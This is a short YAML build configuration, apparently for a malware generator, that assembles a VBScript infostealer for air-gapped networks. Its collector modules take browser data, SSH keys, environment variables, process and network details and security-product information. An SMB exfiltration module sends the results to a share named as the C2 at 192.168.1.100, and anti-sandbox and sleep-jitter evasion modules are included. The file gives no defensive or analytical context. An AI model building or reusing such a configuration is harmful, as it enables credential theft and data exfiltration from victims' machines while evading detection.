name: vbs_infostealer_smb
description: VBScript infostealer with SMB exfil for air-gapped environments
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/env_vars
  - collectors/drives
  - collectors/installed_software
  - collectors/security_products
  - collectors/browser_chromium
  - collectors/ssh_keys

exfil: exfil/smb_write
arch: arch/sequential

evasion:
  - evasion/anti_sandbox
  - evasion/sleep_jitter

vars:
  C2_SHARE: "\\\\192.168.1.100\\share$"
